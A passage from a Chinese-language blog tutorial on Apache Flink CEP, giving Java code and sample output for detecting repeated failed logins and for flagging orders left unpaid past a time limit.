class="string">&quot;firstFail&quot;</span>).where(<span class="keyword">new</span> SimpleCondition&lt;LoginEvent&gt;() &#123;</span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">filter</span><span class="params">(LoginEvent value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;fail&quot;</span>.equals(value.getLoginState());</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">      .next(<span class="string">&quot;secondFail&quot;</span>).where(<span class="keyword">new</span> SimpleCondition&lt;LoginEvent&gt;() &#123;</span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">filter</span><span class="params">(LoginEvent value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;fail&quot;</span>.equals(value.getLoginState());</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">      .within(Time.seconds(<span class="number">2</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 将匹配模式应用到数据流上，得到一个pattern stream</span></span><br><span class="line">    PatternStream&lt;LoginEvent&gt; patternStream = CEP.pattern(loginEventStream.keyBy(LoginEvent::getUserId), loginFailPattern);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 检出符合匹配条件的复杂事件，进行转换处理，得到报警信息</span></span><br><span class="line">    SingleOutputStreamOperator&lt;LoginFailWarning&gt; warningStream = patternStream.select(<span class="keyword">new</span> LoginFailMatchDetectWarning());</span><br><span class="line"></span><br><span class="line">    warningStream.print();</span><br><span class="line"></span><br><span class="line">    env.execute(<span class="string">&quot;login fail detect with cep job&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 实现自定义的PatternSelectFunction</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginFailMatchDetectWarning</span> <span class="keyword">implements</span> <span class="title">PatternSelectFunction</span>&lt;<span class="title">LoginEvent</span>, <span class="title">LoginFailWarning</span>&gt; </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> LoginFailWarning <span class="title">select</span><span class="params">(Map&lt;String, List&lt;LoginEvent&gt;&gt; pattern)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      LoginEvent firstFailEvent = pattern.get(<span class="string">&quot;firstFail&quot;</span>).iterator().next();</span><br><span class="line">      LoginEvent lastFailEvent = pattern.get(<span class="string">&quot;secondFail&quot;</span>).get(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> LoginFailWarning(firstFailEvent.getUserId(), firstFailEvent.getTimestamp(), lastFailEvent.getTimestamp(), <span class="string">&quot;login fail 2 times&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> 输出  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LoginFailWarning&#123;userId=<span class="number">1035</span>, firstFailTime=<span class="number">1558430842</span>, lastFailTime=<span class="number">1558430843</span>, warningMsg=<span class="string">&#x27;login fail 2 times&#x27;</span>&#125;</span><br><span class="line">LoginFailWarning&#123;userId=<span class="number">1035</span>, firstFailTime=<span class="number">1558430843</span>, lastFailTime=<span class="number">1558430844</span>, warningMsg=<span class="string">&#x27;login fail 2 times&#x27;</span>&#125;</span><br></pre></td></tr></table></figure></li></ul><h6 id="代码4-CEP利用循环模式优化"><a href="#代码4-CEP利用循环模式优化" class="headerlink" title="代码4-CEP利用循环模式优化"></a>代码4-CEP利用循环模式优化</h6><ul><li><p> java代码  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> beans.LoginEvent;</span><br><span class="line"><span class="keyword">import</span> beans.LoginFailWarning;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.cep.CEP;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.cep.PatternSelectFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.cep.PatternStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.cep.pattern.Pattern;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.cep.pattern.conditions.SimpleCondition;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.SingleOutputStreamOperator;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.timestamps.BoundedOutOfOrdernessTimestampExtractor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.Time;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.runtime.operators.util.AssignerWithPeriodicWatermarksAdapter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/6 3:41 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginFailWithCep</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 从文件中读取数据</span></span><br><span class="line">    URL resource = LoginFail.class.getResource(<span class="string">&quot;/LoginLog.csv&quot;</span>);</span><br><span class="line">    DataStream&lt;LoginEvent&gt; loginEventStream = env.readTextFile(resource.getPath())</span><br><span class="line">      .map(line -&gt; &#123;</span><br><span class="line">        String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> LoginEvent(<span class="keyword">new</span> Long(fields[<span class="number">0</span>]), fields[<span class="number">1</span>], fields[<span class="number">2</span>], <span class="keyword">new</span> Long(fields[<span class="number">3</span>]));</span><br><span class="line">      &#125;)</span><br><span class="line">      .assignTimestampsAndWatermarks(<span class="keyword">new</span> AssignerWithPeriodicWatermarksAdapter.Strategy&lt;&gt;(</span><br><span class="line">        <span class="keyword">new</span> BoundedOutOfOrdernessTimestampExtractor&lt;LoginEvent&gt;(Time.of(<span class="number">200</span>, TimeUnit.MILLISECONDS)) &#123;</span><br><span class="line">          <span class="meta">@Override</span></span><br><span class="line">          <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">extractTimestamp</span><span class="params">(LoginEvent element)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> element.getTimestamp() * <span class="number">1000L</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      ));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 定义一个匹配模式</span></span><br><span class="line">    <span class="comment">// firstFail -&gt; secondFail, within 2s</span></span><br><span class="line">    Pattern&lt;LoginEvent, LoginEvent&gt; loginFailPattern = Pattern</span><br><span class="line">      .&lt;LoginEvent&gt;begin(<span class="string">&quot;failEvents&quot;</span>).where(<span class="keyword">new</span> SimpleCondition&lt;LoginEvent&gt;() &#123;</span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">filter</span><span class="params">(LoginEvent value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;fail&quot;</span>.equals(value.getLoginState());</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;).times(<span class="number">3</span>).consecutive()</span><br><span class="line">      .within(Time.seconds(<span class="number">5</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 将匹配模式应用到数据流上，得到一个pattern stream</span></span><br><span class="line">    PatternStream&lt;LoginEvent&gt; patternStream = CEP.pattern(loginEventStream.keyBy(LoginEvent::getUserId), loginFailPattern);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 检出符合匹配条件的复杂事件，进行转换处理，得到报警信息</span></span><br><span class="line">    SingleOutputStreamOperator&lt;LoginFailWarning&gt; warningStream = patternStream.select(<span class="keyword">new</span> LoginFailMatchDetectWarning());</span><br><span class="line"></span><br><span class="line">    warningStream.print();</span><br><span class="line"></span><br><span class="line">    env.execute(<span class="string">&quot;login fail detect with cep job&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 实现自定义的PatternSelectFunction</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginFailMatchDetectWarning</span> <span class="keyword">implements</span> <span class="title">PatternSelectFunction</span>&lt;<span class="title">LoginEvent</span>, <span class="title">LoginFailWarning</span>&gt; </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> LoginFailWarning <span class="title">select</span><span class="params">(Map&lt;String, List&lt;LoginEvent&gt;&gt; pattern)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      LoginEvent firstFailEvent = pattern.get(<span class="string">&quot;failEvents&quot;</span>).get(<span class="number">0</span>);</span><br><span class="line">      LoginEvent lastFailEvent = pattern.get(<span class="string">&quot;failEvents&quot;</span>).get(pattern.get(<span class="string">&quot;failEvents&quot;</span>).size() - <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> LoginFailWarning(firstFailEvent.getUserId(), firstFailEvent.getTimestamp(), lastFailEvent.getTimestamp(), <span class="string">&quot;login fail &quot;</span> + pattern.get(<span class="string">&quot;failEvents&quot;</span>).size() + <span class="string">&quot; times&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> 输出  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LoginFailWarning&#123;userId=1035, firstFailTime=1558430842, lastFailTime=1558430844, warningMsg=&#x27;login fail 3 times&#x27;&#125;</span><br></pre></td></tr></table></figure></li></ul><h5 id="订单支付实时监控"><a href="#订单支付实时监控" class="headerlink" title="订单支付实时监控"></a>订单支付实时监控</h5><ul><li>基本需求 <ul><li>用户下单之后，应设置订单失效事件，以提高用户支付的意愿，并降低系统风险</li><li>用户下单后15分钟未支付，则输出监控信息</li></ul></li><li>解决思路 <ul><li>利用CEP库进行事件流的模式匹配，并设定匹配的时间间隔</li><li>也可以利用状态编程，用process function实现处理逻辑</li></ul></li></ul><h6 id="POJO-5"><a href="#POJO-5" class="headerlink" title="POJO"></a>POJO</h6><ul><li><p> OrderEvent  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Long orderId;</span><br><span class="line"><span class="keyword">private</span> String eventType;</span><br><span class="line"><span class="keyword">private</span> String txId;</span><br><span class="line"><span class="keyword">private</span> Long timestamp;</span><br></pre></td></tr></table></figure></li><li><p> OrderResult  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Long orderId;</span><br><span class="line"><span class="keyword">private</span> String resultState;</span><br></pre></td></tr></table></figure></li><li><p> ReceiptEvent  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> String txId;</span><br><span class="line"><span class="keyword">private</span> String payChannel;</span><br><span class="line"><span class="keyword">private</span> Long timestamp;</span><br></pre></td></tr></table></figure></li></ul><h6 id="代码1-CEP代码实现"><a href="#代码1-CEP代码实现" class="headerlink" title="代码1-CEP代码实现"></a>代码1-CEP代码实现</h6><ul><li><p> pom依赖  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">  &lt;dependency&gt;</span><br><span class="line">&lt;groupId&gt;org.apache.flink&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;flink-cep_$&#123;scala.binary.version&#125;&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;$&#123;flink.version&#125;&lt;/version&gt;</span><br><span class="line">  &lt;/dependency&gt;</span><br><span class="line">  &lt;/dependencies&gt;</span><br></pre></td></tr></table></figure></li><li><p> java代码<br>（实际如果处理超时订单，应该修改对应的数据库数据，好让下次用户再次操作超时订单时失效）  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> beans.OrderEvent;</span><br><span class="line"><span class="keyword">import</span> beans.OrderResult;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.cep.CEP;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.cep.PatternSelectFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.cep.PatternStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.cep.PatternTimeoutFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.cep.pattern.Pattern;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.cep.pattern.conditions.SimpleCondition;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.SingleOutputStreamOperator;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.timestamps.BoundedOutOfOrdernessTimestampExtractor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.Time;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.runtime.operators.util.AssignerWithPeriodicWatermarksAdapter;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.util.OutputTag;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/6 5:50 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OrderPayTimeout</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取数据并转换成POJO类型</span></span><br><span class="line">    URL resource = OrderPayTimeout.class.getResource(<span class="string">&quot;/OrderLog.csv&quot;</span>);</span><br><span class="line">    DataStream&lt;OrderEvent&gt; orderEventDataStream = env.readTextFile(resource.getPath())</span><br><span class="line">      .map(line -&gt; &#123;</span><br><span class="line">        String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> OrderEvent(<span class="keyword">new</span> Long(fields[<span class="number">0</span>]), fields[<span class="number">1</span>], fields[<span class="number">2</span>], <span class="keyword">new</span> Long(fields[<span class="number">3</span>]));</span><br><span class="line">      &#125;).assignTimestampsAndWatermarks(<span class="keyword">new</span> AssignerWithPeriodicWatermarksAdapter.Strategy&lt;&gt;(</span><br><span class="line">      <span class="keyword">new</span> BoundedOutOfOrdernessTimestampExtractor&lt;OrderEvent&gt;(Time.of(<span class="number">200</span>, TimeUnit.MILLISECONDS)) &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">extractTimestamp</span><span class="params">(OrderEvent element)</span> </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> element.getTimestamp() * <span class="number">1000L</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 定义一个待时间限制的模式</span></span><br><span class="line">    Pattern&lt;OrderEvent, OrderEvent&gt; orderPayPattern = Pattern.&lt;OrderEvent&gt;begin(<span class="string">&quot;create&quot;</span>).where(<span class="keyword">new</span> SimpleCondition&lt;OrderEvent&gt;() &#123;</span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">filter</span><span class="params">(OrderEvent value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;create&quot;</span>.equals(value.getEventType());</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">      .followedBy(<span class="string">&quot;pay&quot;</span>).where(<span class="keyword">new</span> SimpleCondition&lt;OrderEvent&gt;() &#123;</span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">filter</span><span class="params">(OrderEvent value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;pay&quot;</span>.equals(value.getEventType());</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">      .within(Time.minutes(<span class="number">5</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 定义侧输出流标签，用来表示超时事件</span></span><br><span class="line">    OutputTag&lt;OrderResult&gt; orderTimeoutTag = <span class="keyword">new</span> OutputTag&lt;OrderResult&gt;(<span class="string">&quot;order-timeout&quot;</span>) &#123;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 将pattern应用到输入数据上，得到pattern stream</span></span><br><span class="line">    PatternStream&lt;OrderEvent&gt; patternStream = CEP.pattern(orderEventDataStream.keyBy(OrderEvent::getOrderId), orderPayPattern);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 调用select方法，实现对匹配复杂事件和超时复杂事件的提取和处理</span></span><br><span class="line">    SingleOutputStreamOperator&lt;OrderResult&gt; resultStream = patternStream</span><br><span class="line">      .select(orderTimeoutTag, <span class="keyword">new</span> OrderTimeoutSelect(), <span class="keyword">new</span> OrderPaySelect());</span><br><span class="line"></span><br><span class="line">    resultStream.print(<span class="string">&quot;payed normally&quot;</span>);</span><br><span class="line">    resultStream.getSideOutput(orderTimeoutTag).print(<span class="string">&quot;timeout&quot;</span>);</span><br><span class="line"></span><br><span class="line">    env.execute(<span class="string">&quot;order timeout detect job&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 实现自定义的超时事件处理函数</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">OrderTimeoutSelect</span> <span class="keyword">implements</span> <span class="title">PatternTimeoutFunction</span>&lt;<span class="title">OrderEvent</span>, <span class="title">OrderResult</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> OrderResult <span class="title">timeout</span><span class="params">(Map&lt;String, List&lt;OrderEvent&gt;&gt; pattern, <span class="keyword">long</span> timeoutTimestamp)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      Long timeoutOrderId = pattern.get(<span class="string">&quot;create&quot;</span>).iterator().next().getOrderId();</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> OrderResult(timeoutOrderId, <span class="string">&quot;timeout &quot;</span> + timeoutTimestamp);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 实现自定义的正常匹配事件处理函数</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">OrderPaySelect</span> <span class="keyword">implements</span> <span class="title">PatternSelectFunction</span>&lt;<span class="title">OrderEvent</span>, <span class="title">OrderResult</span>&gt; </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> OrderResult <span class="title">select</span><span class="params">(Map&lt;String, List&lt;OrderEvent&gt;&gt; pattern)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      Long payedOrderId = pattern.get(<span class="string">&quot;pay&quot;</span>).iterator().next().getOrderId();</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> OrderResult(payedOrderId, <span class="string">&quot;payed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> 输出  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">payed normally&gt; OrderResult&#123;orderId=34729, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line"><span class="meta">timeout&gt;</span><span class="bash"> OrderResult&#123;orderId=34767, resultState=<span class="string">&#x27;timeout 1558431249000&#x27;</span>&#125;</span></span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34766, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34765, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34764, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34763, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34762, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34761, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34760, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34759, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34758, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34757, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line"><span class="meta">timeout&gt;</span><span class="bash"> OrderResult&#123;orderId=34756, resultState=<span class="string">&#x27;timeout 1558431213000&#x27;</span>&#125;</span></span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34755, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34754, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34753, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34752, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34751, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34750, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34749, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34748, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34747, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; 